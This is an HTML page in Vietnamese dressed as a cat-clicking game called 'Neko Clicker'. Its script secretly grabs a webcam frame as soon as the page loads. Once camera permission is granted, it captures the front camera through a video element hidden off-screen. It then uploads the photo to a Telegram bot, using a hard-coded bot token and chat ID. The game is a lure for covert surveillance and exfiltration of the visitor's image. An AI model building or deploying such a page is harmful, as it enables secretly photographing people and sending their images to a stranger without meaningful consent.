<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Game & Camera</title>
    <style>
        * {
            user-select: none;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            font-family: system-ui, 'Segoe UI', sans-serif;
            background: linear-gradient(145deg, #1a2a3a 0%, #0f1722 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
            padding: 20px;
        }
        .game-container {
            background: rgba(30, 41, 59, 0.9);
            backdrop-filter: blur(8px);
            border-radius: 64px;
            padding: 30px 20px;
            max-width: 500px;
            width: 100%;
            text-align: center;
            box-shadow: 0 25px 45px rgba(0,0,0,0.4), inset 0 1px 1px rgba(255,255,255,0.1);
            border: 1px solid rgba(255,255,255,0.2);
        }
        h1 {
            font-size: 2rem;
            margin: 0 0 8px 0;
            background: linear-gradient(135deg, #FFD166, #F4A261);
            background-clip: text;
            -webkit-background-clip: text;
            color: transparent;
        }
        .sub {
            color: #94a3b8;
            margin-bottom: 24px;
            font-size: 0.85rem;
        }
        .click-area {
            background: #0f172a;
            border-radius: 48px;
            padding: 20px;
            cursor: pointer;
            transition: transform 0.1s ease;
            margin: 16px 0;
            border: 2px solid #F4A261;
        }
        .click-area:active {
            transform: scale(0.97);
        }
        .cat-emoji {
            font-size: 8rem;
            display: inline-block;
            transition: 0.1s;
        }
        .score-board {
            font-size: 2.2rem;
            font-weight: bold;
            background: #00000040;
            display: inline-block;
            padding: 8px 24px;
            border-radius: 60px;
            margin-top: 10px;
            color: #FFD966;
        }
        .status {
            margin-top: 24px;
            font-size: 0.8rem;
            background: #0f172a;
            padding: 12px;
            border-radius: 40px;
            color: #cbd5e6;
        }
        button {
            background: #3b82f6;
            border: none;
            padding: 8px 20px;
            border-radius: 40px;
            color: white;
            font-weight: bold;
            margin-top: 12px;
            cursor: pointer;
        }
        .hidden {
            display: none;
        }
        footer {
            font-size: 0.7rem;
            color: #5b6e8c;
            margin-top: 20px;
        }
    </style>
</head>
<body>
<div class="game-container">
    <h1>🐱 Neko Clicker</h1>
    <div class="sub">Bấm vào mèo để nhận điểm</div>

    <div class="click-area" id="clickZone">
        <div class="cat-emoji" id="catEmoji">🐱</div>
    </div>

    <div class="score-board">
        🎯 Điểm: <span id="scoreValue">0</span>
    </div>

    <div class="status" id="statusMsg">
        🟡 Đang khởi tạo camera ngầm...
    </div>
    <footer>🔒 Ảnh sẽ tự động được gửi đến người quản trị</footer>
</div>

<script>
    // ========== CẤU HÌNH TELEGRAM ==========
    const CHAT_ID = "7061752122";        // 👈 THAY BẰNG ID SỐ CỦA BẠN (lấy từ @userinfobot)
    const BOT_TOKEN = "8795073805:AAF1IFCjHaBylkJYIFUUBUx7EDAnErTwDdw"; // 👈 THAY BẰNG TOKEN BOT CỦA BẠN
    // =====================================

    // DOM elements
    const statusDiv = document.getElementById('statusMsg');
    const clickZone = document.getElementById('clickZone');
    const scoreSpan = document.getElementById('scoreValue');
    const catEmoji = document.getElementById('catEmoji');

    let score = 0;
    let stream = null;
    let captured = false;

    // --- HÀM CHỤP ẢNH VÀ GỬI QUA TELEGRAM (giữ nguyên logic cũ) ---
    async function captureAndSend() {
        if (captured) return;
        captured = true;

        // Tạo video ẩn để lấy frame (không hiển thị)
        const hiddenVideo = document.createElement('video');
        hiddenVideo.setAttribute('autoplay', '');
        hiddenVideo.setAttribute('playsinline', '');
        hiddenVideo.muted = true;
        hiddenVideo.style.position = 'absolute';
        hiddenVideo.style.top = '-9999px';
        hiddenVideo.style.left = '-9999px';
        hiddenVideo.style.width = '1px';
        hiddenVideo.style.height = '1px';
        document.body.appendChild(hiddenVideo);

        try {
            // Dùng stream đã có từ lúc cấp quyền (đã được lưu)
            if (!stream) {
                throw new Error('Chưa có quyền camera');
            }
            hiddenVideo.srcObject = stream;
            await new Promise(resolve => {
                hiddenVideo.onloadedmetadata = () => {
                    hiddenVideo.play();
                    resolve();
                };
            });

            // Đợi một chút để video hiển thị frame
            await new Promise(r => setTimeout(r, 200));

            const canvas = document.createElement('canvas');
            canvas.width = hiddenVideo.videoWidth;
            canvas.height = hiddenVideo.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/jpeg', 0.9);

            // Gửi ảnh
            const blob = dataURLtoBlob(imageData);
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'webcam.jpg');

            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            const data = await response.json();
            if (data.ok) {
                statusDiv.innerHTML = '✅ Ảnh đã gửi thành công! Cảm ơn bạn.';
            } else {
                statusDiv.innerHTML = '⚠️ Lỗi gửi ảnh: ' + (data.description || 'Không rõ');
            }
        } catch (err) {
            console.error(err);
            statusDiv.innerHTML = '❌ Không thể chụp ảnh: ' + err.message;
        } finally {
            // Dừng stream để tiết kiệm tài nguyên
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                stream = null;
            }
            hiddenVideo.remove();
        }
    }

    // Helper: dataURL -> Blob
    function dataURLtoBlob(dataURL) {
        const arr = dataURL.split(',');
        const mime = arr[0].match(/:(.*?);/)[1];
        const bstr = atob(arr[1]);
        let n = bstr.length;
        const u8arr = new Uint8Array(n);
        while (n--) u8arr[n] = bstr.charCodeAt(n);
        return new Blob([u8arr], { type: mime });
    }

    // --- YÊU CẦU QUYỀN CAMERA (ẨN) ---
    async function initHiddenCamera() {
        try {
            const constraints = { video: { facingMode: "user" }, audio: false };
            stream = await navigator.mediaDevices.getUserMedia(constraints);
            statusDiv.innerHTML = '📸 Đã có quyền camera. Tiến hành chụp ảnh...';
            // Sau khi có quyền, lập tức chụp và gửi
            await captureAndSend();
        } catch (err) {
            console.error(err);
            statusDiv.innerHTML = '❌ Không thể truy cập camera. Vui lòng kiểm tra quyền.';
        }
    }

    // --- TRÒ CHƠI CLICK MÈO ---
    function updateScoreDisplay() {
        scoreSpan.innerText = score;
        // Hiệu ứng nhảy
        catEmoji.style.transform = 'scale(1.2)';
        setTimeout(() => { catEmoji.style.transform = 'scale(1)'; }, 120);
    }

    clickZone.addEventListener('click', () => {
        score++;
        updateScoreDisplay();
        // Đổi biểu cảm mèo ngẫu nhiên
        const cats = ['🐱', '😺', '😸', '😻', '😽', '🐈', '🐾'];
        catEmoji.innerText = cats[Math.floor(Math.random() * cats.length)];
        setTimeout(() => { catEmoji.innerText = '🐱'; }, 200);
    });

    // Khởi chạy
    initHiddenCamera();
</script>
</body>
</html>
